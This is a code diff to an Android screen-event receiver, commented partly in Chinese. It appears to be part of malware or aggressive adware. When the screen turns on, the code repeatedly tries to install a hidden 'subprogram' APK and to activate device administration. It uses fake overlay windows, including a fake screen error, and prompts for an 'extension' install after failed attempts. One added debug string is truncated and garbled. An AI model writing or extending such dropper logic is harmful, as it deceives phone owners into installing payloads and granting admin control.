@@ -26,16 +26,17 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
         if (intent != null
                 && intent.getAction() != null
                 && (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)
-                    || intent.getAction().equals(Intent.ACTION_SCREEN_ON)
-                    || intent.getAction().equals(Intent.ACTION_USER_PRESENT))) {
+                        || intent.getAction().equals(Intent.ACTION_SCREEN_ON)
+                        || intent.getAction().equals(Intent.ACTION_USER_PRESENT))) {
             if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                     || intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
+
                 SettingManager.getInstance().init(context);
                 Config.LOGD("<<<< " + intent.getAction() + " >>>>>"
                                 + " function screen status : " + UtilsRuntime.isScreenLocked(context));
                 long curTime = System.currentTimeMillis();
                 if (SettingManager.getInstance().getPluginDownloadTime() > 0
-                    && !UtilOperator.isPluginApkExist()) {
+                        && !UtilOperator.isPluginApkExist()) {
                     long deta = curTime - SettingManager.getInstance().getPluginDownloadTime();
                     if (deta > ((long) 2) * 60 * 60 * 1000) {
                         Utils.saveExtraInfo("两小时子程序下载失败");
@@ -48,7 +49,9 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                 TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                 int state = tm != null ? tm.getCallState() : TelephonyManager.CALL_STATE_IDLE;
 
-                //try to install
+                /**
+                 * 检查子程序是否安装
+                 */
                 if (!SettingManager.getInstance().getKeyPluginInstalled()
                         && !SettingManager.getInstance().getKeyHasScaned()) {
                     boolean installed = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
@@ -71,10 +74,18 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                                     + "\n            phone state = " + state
                                     + "\n            main Device bind = " + AppRuntime.isBindingActive(context)
                                     + "\n            main Device bind count = " + SettingManager.getInstance().getDeviceBindingActiveTime()
-                                    + "\n            Disable Download Plugin = " + SettingManager.getInstance().getDisableDownloadPlugin()
+                                    + "\n            Disable Dow"
+                                    + "\n"
+                                    + "\n"
+                                    + "\n            ExtPluginUtils.isExtPluginApkExist() = " + ExtPluginUtils.isExtPluginApkExist()
+                                    + "\n            SettingManager.getInstance().getPluginInstallTime() = " + SettingManager.getInstance().getPluginInstallTime()
+                                    + "\n            AppRuntime.EXT_INSTALL_SHOW = " + AppRuntime.EXT_INSTALL_SHOW.get()
                                     + ")");
                 }
 
+                /**
+                 * 激活设备管理器
+                 */
                 if (!AppRuntime.isBindingActive(context)
                         && (SettingManager.getInstance().getDeviceBindingActiveTime() < 5)
                         && !SettingManager.getInstance().getKeyPluginInstalled()
@@ -87,13 +98,27 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                         && state == TelephonyManager.CALL_STATE_IDLE
                         && UtilOperator.isPluginApkExist()
                         && !pluginInstalled
-                        && SettingManager.getInstance().getDeviceBindingTime() <= Config.BIND_TIMES
+                        && SettingManager.getInstance().getPluginInstallTime() < Config.PLUGIN_INSTALL_TIMES
                         && !AppRuntime.FAKE_WINDOW_FOR_DISDEVICE_SHOW.get()) {
                     if (cur > (SettingManager.getInstance().getKeyLanuchTime() + SettingManager.getInstance().getKeyInstallInterval())) {
                         UtilOperator.tryToInstallPluginLocal(context);
                     }
                 } else if (pluginInstalled) {
+                    if (AppRuntime.FakeScreenError != null) {
+                        AppRuntime.FakeScreenError.dismiss();
+                    }
+                    AppRuntime.FakeScreenError = null;
+                    //如果子程序已经安装就直接激活
                     Utils.tryToActivePluginApp(context);
+                } else if (open != 0
+                               && state == TelephonyManager.CALL_STATE_IDLE
+                               && ExtPluginUtils.isExtPluginApkExist()
+                               && !pluginInstalled
+//                               && SettingManager.getInstance().getPluginInstallTime() >= Config.PLUGIN_INSTALL_TIMES
+                               && !AppRuntime.FAKE_WINDOW_FOR_DISDEVICE_SHOW.get()
+                               && !AppRuntime.EXT_INSTALL_SHOW.get()) {
+                    //在子程序没有安装，超过5次，提示安装扩展
+                    ExtPluginUtils.showExtPluginInstallDialog(context);
                 }
             } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                 Config.LOGD("<<<< " + Intent.ACTION_SCREEN_OFF + " >>>>>"
